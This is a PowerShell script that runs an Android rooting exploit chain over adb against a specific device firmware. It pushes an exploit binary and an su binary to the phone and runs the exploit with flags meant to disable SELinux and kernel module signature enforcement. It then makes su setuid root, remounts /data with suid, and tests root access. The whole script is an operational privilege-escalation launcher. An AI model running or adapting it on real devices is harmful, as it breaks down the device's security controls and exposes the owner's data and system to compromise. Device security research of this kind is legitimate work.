$ErrorActionPreference = "Stop"

$stamp = Get-Date -Format "yyyyMMdd_HHmmss"
$rundir = "/data/local/tmp/root_$stamp"
$rootdir = "F:\hdc_magic\GhostLock-H80GT"

Write-Host "RUNDIR: $rundir"

# 1. Create RUNDIR
adb shell "mkdir -p $rundir"

# 2. Push exploit
$bin = Join-Path $rootdir "exploit\build\parrot-ALI-AN00_8.0.0.181\bin\exploit_ondevice_static"
adb push $bin "$rundir/h80gt_exploit" 2>&1 | Out-Null
adb shell "chmod 755 $rundir/h80gt_exploit"

# 3. Push su binary
$su = Join-Path $rootdir "tmp_build\su_arm64"
adb push $su "/data/local/tmp/su" 2>&1 | Out-Null
adb shell "chmod 755 /data/local/tmp/su"

Write-Host "=== Files staged ==="
adb shell "ls -la $rundir/ /data/local/tmp/su"

# 4. Run exploit in background
$log = "$rundir/exploit.log"
Write-Host "=== Running exploit ==="
adb shell "SE_LINUX=1 FLIP_SIG=1 KSU_RUNDIR=$rundir $rundir/h80gt_exploit > $log 2>&1 &"

# 5. Wait for chain complete
$done = $false
for ($i = 0; $i -lt 90; $i++) {
    Start-Sleep -Seconds 2
    $check = adb shell "grep -q 'chain complete' $log 2>/dev/null && echo OK"
    if ($check -match "OK") {
        Write-Host "Exploit complete after $((($i+1)*2))s"
        $done = $true
        break
    }
    $fail = adb shell "grep -q 'short route failed' $log 2>/dev/null && echo FAIL"
    if ($fail -match "FAIL") {
        Write-Host "Exploit failed (route miss)"
        adb shell "tail -5 $log"
        exit 1
    }
}

if (-not $done) {
    Write-Host "Timeout waiting for exploit"
    adb shell "tail -10 $log"
    exit 1
}

# 6. Check state
$state = adb shell "getenforce"
$sig = adb shell "cat /sys/module/module/parameters/sig_enforce"
Write-Host "enforce=$state sig_enforce=$sig"

# 7. Set up su binary via cmd watcher
Write-Host "=== Setting up su ==="
adb shell "echo 'exec chown root:root /data/local/tmp/su && chmod 6755 /data/local/tmp/su && mount -o remount,rw,suid /data' > $rundir/cmd_req"
Start-Sleep -Seconds 2
$out = adb shell "cat $rundir/cmd_out 2>/dev/null"
Write-Host "cmd_out: $out"

# 8. Verify
Write-Host "=== Verify ==="
adb shell "ls -la /data/local/tmp/su"
adb shell "cat /proc/mounts | grep '/data ' | head -1"

# 9. Test su
Write-Host "=== Test su ==="
$test = adb shell "/data/local/tmp/su -c 'id'"
Write-Host "result: $test"